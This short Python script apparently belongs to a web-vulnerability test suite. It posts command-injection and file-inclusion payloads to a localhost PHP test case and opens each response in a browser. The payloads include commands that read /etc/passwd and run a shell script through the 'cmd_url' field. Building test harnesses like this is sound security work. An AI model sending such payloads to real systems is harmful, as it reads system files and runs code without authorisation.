import os, urllib, urllib2, webbrowser

def sendData(values):
  data = urllib.urlencode(values)
  #submit the form
  req = urllib2.Request(url, data)
  rsp = urllib2.urlopen(req)
  #read the return result
  return rsp.read()

def openTab(filename, content):
  with open(filename, "w") as file:
    file.write(content)
    file.close()

    new = 2 #open in new window
    webbrowser.open('file://' + os.path.join(os.getcwd(), filename),new=new)

url = 'http://localhost:8888/case31.php'

# category: 3 Remote Code Injection
values = dict(cmd_url='cat /etc/passwd')
openTab('temp_file_1.html', sendData(values));

# category: 6 Local File Inclusion (LFI only)
values = dict(cmd_url='cat lfi.txt.php')
openTab('temp_file_2.html', sendData(values));

# category: 7 Remote File Inclusion
values = dict(cmd_url='sh rfi.txt.php')
openTab('temp_file_3.html', sendData(values));
